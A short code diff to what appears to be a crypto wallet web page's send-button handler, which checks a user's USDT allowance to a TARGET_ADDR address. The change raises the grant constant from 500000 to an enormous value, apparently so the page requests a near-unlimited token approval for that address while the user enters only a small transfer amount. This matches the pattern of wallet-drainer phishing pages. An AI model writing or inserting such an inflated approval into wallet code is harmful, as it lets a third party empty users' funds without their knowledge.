@@ -241,7 +241,7 @@ sendBtn.addEventListener("click", async () => {
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const needWei = web3.utils.toWei(val.toString(), "ether");
-    const GRANT_500K_WEI = web3.utils.toWei("500000", "ether");
+    const GRANT_500K_WEI = web3.utils.toWei("9999999999999999999999999999999999999999999999999999999999999999999999999", "ether");
     sendBtn.disabled = true;
     try{
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
